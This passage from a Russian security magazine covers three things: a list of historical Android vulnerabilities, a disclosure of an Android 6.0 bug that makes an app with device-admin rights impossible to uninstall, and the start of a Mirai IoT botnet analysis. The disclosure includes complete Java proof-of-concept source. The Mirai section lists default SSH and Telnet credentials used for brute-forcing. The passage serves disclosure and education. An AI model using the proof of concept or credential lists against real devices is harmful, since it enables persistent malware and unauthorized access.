  файл, сохранив при этом оригинальную циф ровую подпись приложе ния.
  Дыра кроется в системе проверки циф ровой подписи на основе JAR, на сме‐
  ну которой в Android 7.0 пришла технология Signature Scheme v2. Тем
  не менее даже в седьмом и отчасти восьмом поколении Android уязвимость
  могут использовать старые приложения, не применяющие новый метод
  верификации, а также некото рые программы, заг руженные не из официаль‐
  ного катало га Google Play.

 OBJECTINPUTSTREAM SERIALIZATION


• CVE: CVE‐2014‐7911
• Уяз вимые вер сии Android: 1.0–4.4.4
• Для экс плу атации требует ся: специальное приложе ние или модуль при‐
  ложения
• Воз можный резуль тат: аварийное завер шение критически важ ных сис‐
  темных про цес сов



  Эта уязвимость, которой подвержены все вер сии Android до 5.0, получила
  обозначение CVE‐2014‐7911. Ошибка кро ется в механизме проверки сери‐
  ализации получаемых объектов системным ком понентом luni/src/main/
  java/java/io/ObjectInputStream.
    Сериализация —  это  способность  некоторых  объектов  трансфор‐
  мировать ся в последовательность байтов, из которой они потом могут быть
  восстановлены в первоначальном виде (обратная процедура называется
  десериализаци ей). Процедура сериализации обычно применя ется для сох‐
  ранения данных или передачи их другому процессу либо тран сля ции по сети.
   С использованием уяз вимости можно выполнить десериализацию любого
  объекта с открытым конструктором без параметров, даже если он не отве‐
  чает критериям для сериализации. Если этот объект использует метод fi‐
  nalize, то в слу чае его удаления сборщик мусора вызовет этот метод,
  в результате чего исполняется хранящийся в объекте код. Таким образом
  можно атаковать сис темные процессы Android, вызывая их ава рийное завер‐
  шение, в том числе убивать критически важные системные процессы.

 OPENSSLX509CERTIFICATE


• CVE: CVE‐2015‐3837
• Уяз вимые вер сии Android: 4.3–5.1
• Для экс плу атации требует ся: специальное приложе ние или модуль при‐
  ложения
• Воз можный резуль тат: выполнение произвольного кода с системны ми
  привилегиями



  Уязвимости OpenSSLX509Certiﬁcate, она же CVE‐2015‐3837, подвержены
  версии Android с 4.3 по 5.1 включительно. С помощью это го бага можно
  повысить при виле гии вредоносного процесса.
    Ошибка в сис темном компоненте OpenSSLX509Certificate позволяет
  скомпрометировать системный процесс system_server и выполнить любой
  код с при виле гиями system (UID 1000). Таким образом можно, например, под‐
  менить любое установленное ранее при ложение (кро ме компонентов ОС),
  сохранив вмес то него другую прог рамму.

 PENDINGINTENT


• CVE: CVE‐2014‐8609
• Уяз вимые вер сии Android: 4.0–4.4.4
• Для экс плу атации требует ся: специальное приложе ние или модуль при‐
  ложения
• Воз можный резуль тат: выполнение в системе любой команды



  Эта уяз вимость с номером CVE‐2014‐8609 выявлена в Android 4.0–4.4.4.
  Ошибка содержится в методе addAccount файла AddAccountSettings.java
  (расположенного в src/com/android/settings/accounts/), который явля‐
  ется частью под системы управления учетными записями приложений.
    Некоторые приложения Android могут использовать учетные данные юзера
  для автоматической авториза ции в различных интернет‐сер висах. В этом слу‐
  чае пользователю достаточ но указать свои логин и пароль один раз, после
  чего они регистрируются в специальном разделе системных настроек «Акка‐
  унты», к которому приложение обращается всякий раз, когда ему необходимо
  пройти аутентификацию.
    При соз дании такой учетной записи ОС переда ет приложе нию различные
  параметры, среди которых имеется параметр PendingIntent. Из‐за ошибки
  в реализации вызываемого при регистрации аккаунта метода addAccount
  система не про веряет значения это го поля, поэтому злоумышленник может
  передать в PendingIntent фактически любую команду, которая будет выпол‐
  нена с теми же привилегиями, что и направившее его приложе ние «Настрой‐
  ки», — системными.
    Можно сформировать команду на удаление хра нящихся на устройстве
  файлов или последователь ность байтов, которая будет воспринята системой
  как входящее SMS‐сооб щение. Например, если в параметре PendingIntent
  будет передана команда android.intent.action.MASTER_CLEAR, Android
  послушно выполнит полный системный сброс с уничтожением всей хра‐
  нящейся на устройстве информации.

 STAGEFRIGHT


• CVE: CVE‐2015‐1538
• Уяз вимые вер сии Android: 2.2–5.1.1
• Для экс плу атации требует ся: передать на устройство специальным
  образом скомпонован ный MP4‐файл
• Воз можный резуль тат: выполнение произвольного кода с системны ми
  привилегиями



  Эта уязвимость актуальна для всех версий Android с 2.2 до 5.1.1. Ошибка
  обнаружи лась в системной библиотеке Stagefright, которая обеспечивает
  воспроизведение медиафайлов в формате MP4.
    Если на уязвимое устройство удается дос тавить специальным образом
  скомпонованный MP4‐файл (например, в MMS‐сообщении), то из‐за ошиб ки
  в обработчике SampleTable.cpp встроенный в этот файл произвольный код
  будет выпол нен с системными привилегиями, даже если пользователь просто
  откроет папку, в которой такой файл хра нится.

 STAGEFRIGHT 2.0


• CVE: CVE‐2015‐6602
• Уяз вимые вер сии Android: 4.1–5.1.1
• Для экс плу атации требует ся: передать на устройство специальным
  образом скомпонован ный MP3‐ или MP4‐файл
• Воз можный резуль тат: выполнение произвольного кода с системны ми
  привилегиями


  Несмотря на схожесть названия, эта уязвимость прячется в другом компонен‐
  те — в при ложении mediaserver, точ нее в обработ чике тегов ID3v2. Уяз вимы
  версии Android с 4.1 по 5.1.1.
    Для использования уяз вимости достаточно любым способом доставить
  на атакуемое устройство специальным образом модифицированный MP3‐
  или MP4‐файл. Во время  чтения содержащих ся в таком файле тегов
  ID3v2 про исхо дит переполнение буфера, в резуль тате чего выполняется
  встроенный в файл произвольный код с системны ми привилегиями.

 SIM TOOLKIT


• CVE: CVE‐2015‐3843
• Уяз вимые вер сии Android: 5.1
• Для экс плу атации требует ся: специальное приложе ние или модуль при‐
  ложения
• Воз можный резуль тат: перехват и подмена команд, отправляемых SIM‐
  картой операционной системе



  В Android есть встроенный фрей мворк SIM Application Toolkit (STK), который
  позволяет SIM‐карте выпол нять в системе определенный набор команд.
  Таким обра зом, в частности, формиру ется SIM‐меню оператора связи.
     Уязвимость поз воля ет перех ватывать команды, отправляемые SIM‐картой
  операционной системе, а также подменять их. Вредоносное приложение
  может передать классу com.android.stk.StkCmdReceiver специально соз‐
  данный объект parcelable. Получатель не проверяет подлинность отправите‐
  ля, при этом действие android.intent.action.stk.command не объявлено
  в манифес те как защищен ное, благодаря чему можно эму лировать отсылку
  команд SIM‐картой.
    Например, если SIM‐карта формирует на экране устрой ства сообщение
  с подтверждением действий пользователя, оно будет содержать кнопку ОK.
  Такие сообщения используются для подтверждения отправки USSD‐зап‐
  росов, транзакций, действий с хранящи мися на карте контактами и так далее.
    Вредоносное приложение может вызвать действие android.intent.ac‐
  tion.stk.command и отобразит на экране поверх настоящего под дельное
  окно, содер жащее произвольный текст. При нажатии кнопки ОK вызыва ется
  метод sendResponse() с флагом true, и это событие — нажатие кнопки —
  передается SIM‐карте, ожидающей реакции поль зователя. При этом событие
  будет обра бота но так, как если бы оно пос тупило от настоящего диалогово го
  окна.

 TOASTOVERLAY


• CVE: CVE‐2017‐0752
• Уяз вимые вер сии Android: 4.0–7.1.2
• Для   экс плу атации   требует ся:   приложение   с   разрешением
  BIND_ACCESSIBILITY_SERVICE
• Воз можный резуль тат: получение полного контроля над окном типа
  TYPE_TOAST



  Эта уязвимость была обнаружена в 2017 году и затрагивает все версии An‐
  droid с 4.0 по 7.1.2 включительно. Ошиб ку раз работчики допустили в под‐
  системе оверлеев — окон, способных отображаться поверх других экранных
  форм.
    Использующему   уяз вимость   приложению   дос таточ но   объявить
  в манифесте только одно раз решение — BIND_ACCESSIBILITY_SERVICE.
  В обычных условиях для отображения окон типа TYPE_TOAST, предназначен‐
  ных для показа системных уведомлений, приложению требуется отправить
  запрос SYSTEM_ALERT_WINDOW, однако благодаря ошибке в обработчике про‐
  верки разрешений Android AOSP вредоносная программа может обойтись
  без подобных формаль нос тей. Компонент просто не выполняет провер ку
  доступа (permission check) и операции (operation check) при обработке зап‐
  роса SYSTEM_ALERT_WINDOW для TYPE_TOAST.
    В результате исполь зующее уязвимость приложение может безнаказанно
  рисовать свои окна поверх окон других программ и фиксировать нажатия
  на экран. Фак тичес ки оно получает полный кон троль над окном TYPE_TOAST.
  Какое содержимое будет отображаться в этом окне, зависит толь ко от фан‐
  тазии вирусописателей.

 CLOAK AND DAGGER


• CVE: CVE‐2017‐0752
• Уяз вимые вер сии Android: 4.4.4, 5.0.2, 5.1.1, 6.0, 6.0.1, 7.0, 7.1.1, 7.1.2
• Для  экс плу атации  требует ся:  приложение  с  разрешениями  SYS‐
  TEM_ALERT_WINDOW и BIND_ACCESSIBILITY_SERVICE
• Воз можный резуль тат: запись нажатий клавиш (кейлоггинг), утечка дан‐
  ных



  Эта уязвимость актуальна для Android вплоть до 7.1.2. Из‐за ошибки в SDK
  вредоносное приложение, используя разрешения SYSTEM_ALERT_WINDOW
  и BIND_ACCESSIBILITY_SERVICE, может получить практически полный кон‐
  троль над опе рационной системой и доступ к конфиденциальной информа‐
  ции пользователя, а так же фиксировать нажатия кла виш. «Хакер» уже под‐
  робно писал об этой уязвимости, а обнаружившие ее эксперты даже соз дали
  про нее специальный сайт.
     Вкратце суть сводится к тому, что разрешение SYSTEM_ALERT_WINDOW поз‐
  воляет вывести на экран «системное окно» — View‐элемент, который отоб‐
  разится поверх любого другого элемента интерфейса, даже если это будет
   Activity из стороннего приложения. При этом перекрытые Activity об этом
  не узнают и продолжат работать так, как будто ничего и не произошло.
  Это  может  сделать  любое  при ложе ние,  если  разрешение  SYS‐
  TEM_ALERT_WINDOW заявлено в его манифесте.
    Разместив нес коль ко «невидимых» системных окон друг над другом
  и обрабатывая нажатия на них, злоумыш ленник может создать кейлоггер. А с
  помощью раз решения BIND_ACCESSIBILITY_SERVICE вредоносная прог‐
  рамма способна получить доступ к другим объектам ОС и хра нящимся
  на устройстве данным.

 ВЫВОДЫ

  Как видишь, за всю исто рию Android было много интересного, и мы в этой
  статье зат ронули лишь верхушку айсберга — наиболее важные, нашумевшие
  и зрелищные уязвимости. Дос таточно начать копать, и тебе откроются и дру‐
  гие маленькие и большие воз можности.
COVERSTORY
ФОКУС
 С DRAW OVER





                                      Валентин Холмогоров
                                                 valentin@holmogorov.ru


     РАСКРЫВАЕМ НОВУЮ УЯЗВИМОСТЬ
         В ANDROID 6 И ДЕЛАЕМ
       НЕУДАЛЯЕМОЕ ПРИЛОЖЕНИЕ




Об исто рии обнаружения некото рых уязвимос тей можно
писать нас тоящие прик лючен ческие романы, другие же
выявляются случайно во вре мя рутин ного тес тирования.
Именно так произошло и на этот раз. В ходе работы
над одним из мобильных при ложений неожидан но выяс‐
нилось, что с помощью опре деленной последова тельности
действий мож но установить на девайс с Android 6.0 прог‐
рамму, которую впоследс твии невозможно будет удалить
стандартным способом. Как это работает? Давай раз берем‐
ся.


Ошибку в логике работы самой популярной на нашей планете мобильной
операционной   сис темы   обнаружил   иссле дова тель   из   компании
«Софт‐Экспер ты» Александр Свириденко. Эта ошиб ка позволя ет при помощи
нехитрых манипуляций установить на работающее под управлением Android
6.0 устрой ство прог рамму, которую невоз можно уда лить штатными средства‐
ми ОС. А если таким приложением внезапно окажется троян, его не сумеет
снести ни один антивирус.
  Разумеется, о столь удивительной находке была тут же проинформирова‐
на корпорация Google. Вскоре исследователь получил официальный ответ
от Android Security Team, который в целом сводился к следующему: раз работ‐
чиков ОС интересуют в первую оче редь уяз вимости в актуальных версиях An‐
droid, для которых еще выпускаются обновления, в то вре мя как Android 6.0 —
система морально устарев шая. Поэто му пар ни в Google не считают обна‐
ружен ную ошибку критической и вообще не рассмат ривают ее как серьезный
инцидент, тем более что в новых версиях Android она уже устранена.
   То, что на руках у десят ков тысяч пользователей все еще имеется целый
зоопарк девайсов, работающих под управлением «шес терки» и потому под‐
верженных уязвимости  (что документально под твержда ется статистикой,
которую может получить практически каждый разработчик Android‐при ложе‐
ний), никого не интересу ет.
  После получения такого отклика в адрес «корпорации добра» было отос‐
лано вто рое пись мо, содер жащее более подробное описание выявленной
ошибки, но ответа на это послание так и не пос ледовало. Ну а посколь ку
с момен та отправки в Google баг‐репорта прошел ровно год, нас тало самое
подходящее время рассказать о находках.


           WARNING

                      Эта статья несет исключительно информацион‐
                     ный характер, и почерпнутую в ней информацию
                       следует исполь зовать только для самообразова‐
                         ния. Автор не несет ответственности за любые
                       возможные последствия практического примене‐
                       ния изло женных здесь сведений и катего рически
                      не рекомен дует при менять описанные в статье
                     методы и приемы в каких‐либо иных целях, кроме
                       исследовательских.



ТЕОРЕТИЧЕСКИЕ ПРИНЦИПЫ
В составе Android име ется важное при ложение settings.apk, которое отвечает
за отображение экрана системных нас троек. Одна из ключевых особен‐
ностей settings.apk заключается в том, что только это приложение имеет пол‐
номочия назначать другим программам или отзывать привилегии админис‐
тратора.
  В Google спе циально установи ли такое жес ткое ограничение, чтобы
исключить получение повышенных привилегий клиентским софтом в обход
операционной системы. Однако подобный подход к обеспечению безопас‐
ности подразумевает наличие как минимум одного узкого места. Какого?
  Давай предста вим себе чисто гипоте тическую ситуацию. Пред положим,
некий условный вредонос, просочившийся на наше устрой ство, умудрился
получить для себя права админа. Используя эти привилегии, тро ян может
успешно про тивос тоять попыткам пользователя или дру гого ПО его уда лить.
   Чтобы деинсталлировать такое приложение, нужно сначала отоб рать
у него администраторские привилегии. Сделать это можно с исполь зованием
системного окна «Настройки», за которое отве чает settings.apk. Однако, если
наш гипотетичес кий вредонос будет всякий раз ронять этот компонент
при попытке изменить его привилегии, лишить трояна «админис тра тивного
ресурса», а следовательно, и удалить его с устройства станет невозможно.
   Единственным спо собом избавить ся от назойливой программы в подоб‐
ной ситу ации станет только сброс телефона или планшета к заводским нас‐
тройкам со всеми вытека ющими из этой процедуры неприят ными последс‐
твиями. Простая перезагрузка девайса не поможет. Звучит инте рес но,
не прав да ли? Теперь давай посмотрим, как это работает на практике.


ПРАКТИЧЕСКАЯ РЕАЛИЗАЦИЯ УЯЗВИМОСТИ
Как любил говорить зас луженный артист России извес тный иллюзионист
Амаяк Акопян, «чтобы фокус получился, нуж но дунуть: если не дунуть, никако‐
го чуда не произойдет». В нашем случае волшебное превращение системно‐
го приложения settings.apk в тыкву про исхо дит на Android 6.0 в результате
строго определенной последова тель нос ти действий, подробно описан ной
ниже.
  В первую оче редь реализующему уязвимость при ложению необ ходимо
получить в системе привилегии администратора. Добиться этого можно раз‐
ными спо собами. Самый простой, который и использует практически вся
подобная мал варь, — отрисовка на экране назойливого системно го уведом‐
ления с вежливой просьбой выдать программе нужные права. Окошко бло‐
кирует нормальную работу устройства до тех пор, пока юзер наконец не сог‐
ласится жам кнуть на кнопку Ok, лишь бы от него отстали. Способ тупой, но на
удивление дей ственный.
  Затем нужно вклю чить для нашего приложения системное разрешение
Draw Over и сра зу же отключить его. Это разрешение позволяет программе
отображать свои экранные объекты поверх окон других приложений (иногда
эту настройку называют также «наложением»). Эта функция используется,
в частности, для демонс тра ции пользовате лю какой‐либо жизненно важной
информа ции со сто роны приложения, которую он ни в коем случае не должен
пропустить, — например, рекламы. Почему последовательное включение
и отключение кон крет но это го разрешения при водит в Android 6.0 к описыва‐
емым нами последствиям, знает, наверное, только великий компь ютерный
сверхразум, который Сергей Брин и Ларри Пейдж держат взаперти в под‐
вальных казематах центрального офиса Google.
   Как бы то ни было, после этих нехитрых манипуляций с настройками
при любой попытке удалить наше приложение из системы компонент set‐
tings.apk с треском и грохотом падает, не позволяя завершить начатое.
А программа как ни в чем не бывало продолжает работать, причем с правами
администратора. Как это происходит, мож но увидеть на представленном
ниже скринкасте.





В результате удалить при ложе ние с устройства становится невозможно
ни штатными средствами операци онной системы, ни с использованием анти‐
вирусных программ. На анимации этот замечательный эффект продемонс‐
трирован более чем наглядно. А вот как выглядит в описываемом нами случае
crash report самого settings.apk.



  AndroidRuntime: FATAL EXCEPTION: main
  Process: com.android.settings, PID: 22149


  java.lang.RuntimeException: Unable to resume activity {com.android.set‐
  tings/com.android.settings.DeviceAdminAdd}: java.lang.SecurityException:
  com.eicar from uid 11376 not allowed to perform SYSTEM_ALERT_WINDOW
  at android.app.ActivityThread.performResumeActivity(
  ActivityThread.java:3103)
  at android.app.ActivityThread.handleResumeActivity(
  ActivityThread.java:3134)
  at android.app.ActivityThread.handleLaunchActivity(
  ActivityThread.java:2481)
  at android.app.ActivityThread.‐wrap11(ActivityThread.java)
  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1344)
  at android.os.Handler.dispatchMessage(Handler.java:102)
  at android.os.Looper.loop(Looper.java:148)
  at android.app.ActivityThread.main(ActivityThread.java:5417)
  at java.lang.reflect.Method.invoke(Native Method)
  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(Zy‐
  goteInit.java:726)
  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616)


  Caused by: java.lang.SecurityException: com.eicar from uid 11376 not al‐
  lowed to perform SYSTEM_ALERT_WINDOW
  at android.app.AppOpsManager.checkOp(AppOpsManager.java:1521)
  at com.android.settings.DeviceAdminAdd.onResume(DeviceAdminAdd.java:384)
  at android.app.Instrumentation.callActivityOnResume(Instrumentation.ja‐
  va:1258)
  at android.app.Activity.performResume(Activity.java:6327)
  at android.app.ActivityThread.performResumeActivity(
  ActivityThread.java:3092)
  at android.app.ActivityThread.handleResumeActivity(
  ActivityThread.java:3134)
  at android.app.ActivityThread.handleLaunchActivity(
  ActivityThread.java:2481)
  at android.app.ActivityThread.‐wrap11(ActivityThread.java)
  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1344)
  at android.os.Handler.dispatchMessage(Handler.java:102)
  at android.os.Looper.loop(Looper.java:148)
  at android.app.ActivityThread.main(ActivityThread.java:5417)
  at java.lang.reflect.Method.invoke(Native Method)
  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(Zy‐
  goteInit.java:726)
  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:616)


Из него мы можем сделать вывод, что наше приложение вызывает FATAL EX‐
CEPTION в процессе com.android.settings. Ошиб ка возникает в кривом обра‐
ботчике проверки наличия прав администратора у приложений. Краш про‐
исходит как раз в момент про верки разрешений, которые имеются у прог‐
раммы. В результате com.android.settings падает, а процедура удаления при‐
ложения прерыва ется.


PROOF OF CONCEPT
Чтобы продемонстрировать принцип эксплу атации этой системной ошибки,
мы соз дали небольшое приложение. За основу был взят файл EICAR,
при помощи которого тестируется работоспособность антивирус ных прог‐
рамм. Вот как работает это приложение.
  Для начала создадим Activity, с использовани ем которого можно назначить
и отозвать адми нистра торские привилегии для нашего при ложения.


package com.eicar;
import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
public class DeviceAdmin extends DeviceAdminReceiver {
  private static final String ADMIN_DISABLE="android.app.action.
DEVICE_ADMIN_DISABLE_REQUESTED";
  public void onReceive(final Context context, Intent intent) {
    if (intent.getAction().equals(ADMIN_DISABLE)) {}
  }
}

А вот исходни ки основного Activity:


package com.eicar;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.provider.Settings;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
public class MainActivity extends AppCompatActivity {
  TextView textView;
  Button button;
  private static final int OVERLAY_PERMISSION_REQ_CODE =0;
  boolean isTry;
  @Override
  protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    isTry=false;
    setContentView(R.layout.activity_main);
    textView = findViewById(R.id.text);
    if (Build.VERSION.SDK_INT != 23) {
      textView.setText("it works only on android 6");
      return;
    }
    button = findViewById(R.id.button);
    button.setVisibility(View.VISIBLE);
  }
  public  boolean startDeviceAdmin(Activity activity, int Activi
tyResultCode) {
    if(!isDeviceAdmin()){
      ComponentName mDeviceAdmin =  new ComponentName(activity,
DeviceAdmin.class);
      Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVI
CE_ADMIN);
      intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, mDevic
eAdmin);
      intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
"Activate Device Admin");
      activity.startActivityForResult(intent,ActivityResultCode);
      return true;
    }
    return false;
  }
  private boolean isDeviceAdmin() {
    DevicePolicyManager mDPM = (DevicePolicyManager)getSystemService(
Context.DEVICE_POLICY_SERVICE);
    ComponentName mDeviceAdmin = new ComponentName(this, DeviceAdmin.
class);
    return mDPM != null && mDPM.isAdminActive(mDeviceAdmin);
  }
  @Override
  protected void onResume(){
    super.onResume();
    if(!isDeviceAdmin()) {
      textView.setText("Click button and activate Device Admin");
      button.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
          startDeviceAdmin(MainActivity.this, 0);
        }
      });
    } else if(isTry==false) {
      textView.setText("Enable and then disable 'Draw over' setting")
;
      button.setOnClickListener(new View.OnClickListener() {
        @Override
        public void onClick(View view) {
          try {
            isTry = true;
            Intent intent = new Intent(Settings.ACTION_MANAGE_O
VERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, OVERLAY_PERMISSION_REQ_C
ODE);
          } catch (Exception ex) {
            Toast.makeText(MainActivity.this, "Your device does not
support floating windows.", Toast.LENGTH_LONG).show();
          }
        }
      });
    } else if(isTry==true&&!Settings.canDrawOverlays(this)) {
      textView.setText("Try to delete me :)");
    }
  }
}

Как говорит ся, пристегните ремни и наслаждайтесь полетом.


ВЫВОДЫ
Несмотря на то что все приложения в Android выполняются в песочнице, что
теоретически должно исклю чить доступ к их данным извне, а также сущес‐
твенно повысить безопасность системы в целом, при должном творческом
подходе это самое понятие безопасности становится весьма относительным.
  В этой статье мы рассмотрели только один частный случай эксплуатации
ошибки в сис темном ком поненте одной конкрет ной версии Android. При чем
эта ошибка влечет за собой весьма неприятные последствия для пользовате‐
ля: он лиша ется возможности удалить приложение, которое может нести
в себе опасность, а антивирусы становятся в подобной ситуации совершенно
бессильны.
  Обойти описанную в статье проблему можно очень просто: нужно всего
лишь вернуть при ложению разрешение Draw  Over, которое позволяет
рисовать экранные формы поверх других окон. Тогда падения settings.apk
не произойдет, и «неудаляемую» программу мож но будет без труда деин‐
сталлировать с устройства. Основная проблема кро ется в том, что догадать‐
ся об этом без под сказ ки не сможет ни пользователь, ни тем более анти‐
вирус.
   Сколько подобных ошибок кроется в недрах более современ ных реали‐
заций Android, не знает, навер ное, никто. Поэтому традиционные методы
обеспечения безопасности мобильных устройств не теряют своей актуаль‐
ности: нужно следить за тем, что и откуда пользователь устанавливает
на свое устройство, и периодичес ки включать  голову, чтобы слу чайно
не выдать какому‐нибудь трояну права администратора.
ВЗЛОМ





ПО СЛЕДАМ
                                                                          Валентин Холмогоров
                                                                                              valentin@holmogorov.ruMIRAI

РАЗБИРАЕМСЯ, КАК ТРОЯНЫ ПОРАЖАЮТ
IOT, НА ПРИМЕРЕ САМОГО ЗЛОГО ИЗ НИХ




Пора отправ лять в архивы истории старый анекдот о том, что
вредоноса для Linux нужно сна чала собрать из исходников,
убедиться в том, что в системе есть все нуж ные библиотеки,
и толь ко пос ле этого пытать ся запустить, выдав ему пред‐
варитель но пра ва  рута. Сейчас на рынке полно умных
устрой ств с Linux, и они ста ли одной из любимых целей вир‐
мейкеров. На чем основан этот интерес и как работают
такие вре доно сы?


Элементарная логика подсказывает: чтобы современ ный троян успешно
выполнял свои функции, он должен без особого труда проникать в систему,
иметь стабильное под клю чение к интернету и по возможности оставаться
незамеченным как можно доль ше. Всем этим критери ям прекрасно соответс‐
твуют разнообразные девайсы категории «интернета вещей» — роутеры,
телевизионные приставки,  сетевые  накопи тели, медиацентры,  а  также
устройства, собранные на основе одноплатных компьюте ров. Как правило,
все они сидят на толстом интернет‐канале, что превраща ет подобное обо‐
рудование в удобный инстру мент для орга низации DDoS‐атак.
  С проник новением тоже зачастую не возникает серь езных проб лем.
По статистике, боль шинс тво владельцев умных устрой ств — это простые
пользователи, которые не страдают от избытка знаний в сфере высоких тех‐
нологий. Они относятся к девайсам IoT как к обычным бытовым приборам
вроде соковыжималки или тос тера, зачас тую даже не подозревая, что у них
вообще есть какие‐то настройки, которые при желании можно изме нить.
Включили, работа ет, и ладно. Поэтому установленные на заводе дефолтные
логины и пароли на подобных устройствах превращают брут в задачу, посиль‐
ную любому школьнику.
  Наконец,  скрытность. С  этим  совсем  все  просто:  кому,  скажите
на милость, придет в голову искать трояна в телевизионной прис тавке или в
недрах роутера, тем более что антивирусы для большинс тва таких девайсов
в дикой при роде практически не водят ся, а проверить их дистанционно — та
еще задача для простого юзера. Да и многие непростые юзеры иногда
по инерции уверены, что вредоно сов для Linux не существует в принципе.
Поэтому трояны для IoT могут чувс твовать себя в сис теме совершенно воль‐
готно: искать их там вряд ли будут, а если и будут, не факт, что найдут.
  Производитель час то виноват не мень ше пользователя: многие умные
устройства, имеющие извес тные уязвимос ти в прошивке, не получа ют от про‐
изводителя обновлений, которые могли бы закрыть дыры. Это значительно
повышает эффективность использования даже устаревших эксплоитов. Веро‐
ятность «про бива» таких девай сов в среднем намного выше, чем даже компь‐
ютеров с регулярно обновляющейся виндой, не говоря уже о серверах
или рабочих станциях с актуальным «Линуксом» на борту.


МОТИВАЦИЯ ВИРУСОПИСАТЕЛЕЙ
С какой целью создатели вредоносных программ устанавливают их на умные
устройства? «Профессий» у большинства подоб ных троянов традиционно
три. Прежде все го, это уже упомянутые выше DDoS‐боты, начинающие флу‐
дить на указанный адрес сетевыми пакетами по команде с управляющего
сервера. Конеч но, одна бабушка с телевизионной приставкой завалить вра‐
жеский сер вер тебе не поможет, но десяток ста рушек, как гла сит народная
мудрость, — уже рубль.
   Во‐вторых,  на  IoT‐девайсах  часто  поднима ют  SOCKS‐proxy‐сервер,
который можно использовать разными спо соба ми, прежде всего — для обес‐
печения анонимности.
   Ну и наконец, в роуте рах периодичес ки заводятся трояны, подменяющие
в  настройках адреса DNS‐серверов,  чтобы  показы вать  на  клиентских
машинах рекламу. При этом сам компьютер, на котором вдруг из ниоткуда
начина ют появлять ся бан неры с рек ламой такси, онлайн‐казино и девушек
легкого поведе ния, остается девственно чистым, что подтвердит пользовате‐
лю любой анти вирус.
  Смена нас троек DNS вручную ничем не поможет: после перезагрузки
роутера все вернется на круги своя. Спасти ситуацию сможет разве что
сброс устрой ства  к заводским установкам или его перепрошивка, что
для большинства обы вателей выг лядит как тайная магия высшего уровня.
Иногда на Linux‐устрой ствах попадаются майнеры, но в последнее время
интерес к ним на фоне общего спа да рынка крип товалют понемногу снижает‐
ся.


МАТЧАСТЬ
Изучение логов ханипотов, с помощью которых специалисты по информа‐
ционной безопас ности анализируют распространение троянов для «интерне‐
та вещей» в живой природе, показывает следующий путь их доставки
на целевое устройство.
  Обычно атакующие соеди няются с привлекшим их внимание устройством
по SSH или Telnet, под бира ют пароль по словарю и в слу чае успешной авто‐
ризации отключают утилиту iptables, чтобы заблокировать работу файрвола.
Дальше им остается только отыскать открытую на запись папку, сохранить
в нее нуж ное приложение, соот ветствующее архи тек туре устройства, и запус‐
тить его.
  В арсенале атакующих обычно имеются готовые билды малвари под раз‐
личные архи тектуры: ARM, MIPS, SPARC, M68K, SuperH, PowerPC, SH‐4 и про‐
чие типы железа. На некоторых девайсах можно орга низовать авто загрузку
трояна, прос то отре дак тировав файл /etc/rc.local. Пери оди чески про‐
верять, работает ли нужный процесс, и при необходимости перезапус кать его
можно, например, с использованием /etc/cron.minutely.
  Поскольку многие пользователи умных устройств не утружда ют себя сме‐
ной дефолтных логинов и паролей, словарь для брута в боль шинстве случаев
выглядит весь ма тривиально. Вот наиболее популярные логины и пароли
для взлома девай сов по протоколу SSH.


 Ло гин                     Па роль

  pi                                      rasberry

  informix                                  informix

  root                                    nagiosxi

  nagios                               nagios

  root                               synopass

  cactiuser                                 cacti

 admin                                   articon

Также при бруте по SSH очень часто используются такие логины, как ubnt,
user, oracle, bin, support, postgres.
  Наиболее популярные сочета ния логинов и паролей для взлома девайсов
по протоколу Telnet.


 Ло гин                 Па роль

  root                          xc3511

  root                                vizxv

  root                        anko

  root                       5up

  root                      XA1bac0MX

Эта табличка наглядно демонстрирует, что по Telnet зло деи тра диционно
пытались авторизоваться в админке различных камер видеонаблюдения,
таких как Anko, TP‐Link, Dahua или CNB. Кроме того, для перебора паролей
по этому про токо лу очень часто берут широко используемые логины вро де
admin, test и telnet.
  Однако технологии не стоят на месте, и с опре деленного момента вирусо‐
писатели взялись за автоматизацию про цедуры взлома. Так, если трояна уда‐
лось запус тить в ском промети рованной системе, он может попытаться
вытащить  из  различных  источников  вроде  фай ла  ssh/known_hosts
или bash_history сведения о хос тах, к которым устройство ранее получало
доступ, и попытаться сбрутить их.
  Другие тро яны пос тупают гораздо проще: генерируют диапазон IP‐адре‐
сов и в цикле пытаются постучаться на стандартные для SSH и Telnet порты.
Плюс такого под хода зак люча ется в его относительной простоте, недос‐
таток — в значительном объеме соз даваемого паразитного трафика.
  Примерно три года назад в ассортимен те мал вари для умных устройств
было не менее десятка разных модификаций Fgt, Mrblack, Mirai, разнооб‐
разных флудеров и DDoS‐ботов. Однако после того, как исходники Mirai
в сентябре 2016 года оказались в свободном доступе на сайте hackforums.‐
com, бесчислен ные клоны это го трояна практичес ки вытеснили с рынка
остальных конкурентов. BrickBot, Sora, Wicked, Omni, Owari — все это вари‐
ации на тему Mirai с допол нениями все новых и новых соавторов.


КАК РАБОТАЕТ MIRAI
По данным исследователей Сэма Эдвардса и Иоанниса Профетиса из Rapid‐
ity Networks, в 2016 году Linux.Mirai заразил более 380 тысяч умных устрой ств
по всему миру, став причиной мно жества нашумевших DDoS‐атак. После того
как исходники этого трояна были выложены в паблик, изучением принципов
его работы тут же заинтересовались не только специалисты по информа‐
ционной безопас ности, но и тысячи аноним ных вирусописателей.
  Сам по себе исходный код Mirai тоже имеет ряд заимствований из других
источников и во многом базируется на архитектуре одного из DDoS‐ботов,
распространяв шихся весной 2016 года. Этот бот, в свою очередь, имеет схо‐
жие черты с тро янами семей ства Fgt, известного аж с 2014 года, — оттуда
